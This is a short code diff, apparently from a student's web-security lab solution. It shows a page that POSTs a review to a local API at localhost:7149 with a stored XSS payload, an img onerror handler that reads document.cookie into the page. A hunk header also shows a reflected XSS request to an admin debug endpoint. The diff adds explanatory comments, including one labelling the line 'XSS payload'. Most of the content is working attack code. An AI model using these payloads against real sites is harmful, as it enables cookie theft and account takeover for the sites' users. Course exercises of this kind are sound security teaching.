@@ -33,15 +33,19 @@ fetch("http://localhost:7149/admin/debug-test?DebugTest=<script>" + encodeURICom
   </head>
   <body>
     <script>
+      // Fetch the API page and POST
       fetch("http://localhost:7149/api/review/6", {
         method: "POST",
         headers: {
+          // Important to ensure correct content-type
           "Content-Type": "application/json",
           Accept: "*/*"
         },
+        // Build JSON payload
         body: JSON.stringify({
           title: "Echo found in stack trace: possibly edible.",
-          reviewer: "904160213",  // Use your GTID
+          reviewer: "904160213",
+          // XSS payload
           body: "<img src=x onerror=\"document.querySelector('h5').innerText=document.cookie\">",
           rating: 5,
           recommended: true,
